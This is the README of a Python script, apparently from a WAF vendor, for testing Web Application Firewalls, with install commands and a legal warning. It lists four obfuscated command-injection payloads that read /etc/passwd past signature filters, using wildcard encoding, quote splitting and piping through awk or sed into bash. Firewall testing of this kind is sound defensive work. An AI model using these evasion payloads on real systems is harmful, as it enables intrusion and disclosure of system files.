# WAF Bypass script

WAF bypass is a simple script written in Python3 for testing Web Application Firewall. Turn off ban mode before use.

## When using, do not violate the law!

A script developed for internal needs, including for testing Nemesis WAF and Nemesida WAF Free, but you can use it to test any WAF.

![WAF Bypass Script](https://camo.githubusercontent.com/acd8bc382d0a8c7488a426d8f9817cf9b3de7c1a/68747470733a2f2f696d672e646566636f6e2e72752f73746f72652f323032302f30372f30303134633466633437623066616538636462386637393634383630366435382e706e67)

There are attacks for which it is impossible to create a signature, while not increasing the number of false positives. Therefore, it is absolutely normal that Nemesida WAF Free bypass the attack, and the commercial version of Nemesida WAF Free blocks. For example, we can execute the <code>cat /etc/passwd</code> command in the following ways:
<pre>
%2f???%2f??t%20%2f???%2fp??s??
cat+/e't'c/pa'ss'wd
e'c'ho 'swd test pentest' |awk '{print "cat /etc/pas"$1}' | bash
ec'h'o 'cat /etc/examplewd' | sed 's/example/pass/g' | bash
</pre>

## How to run

<pre>
# mkdir /opt/waf-bypass/
# git clone https://github.com/nemesida-waf/waf_bypass.git /opt/waf-bypass/
# python3 -m pip install -r /opt/waf-bypass/requirements.txt
# cd /opt/waf-bypass/

# python3 /opt/waf-bypass/main.py
</pre>
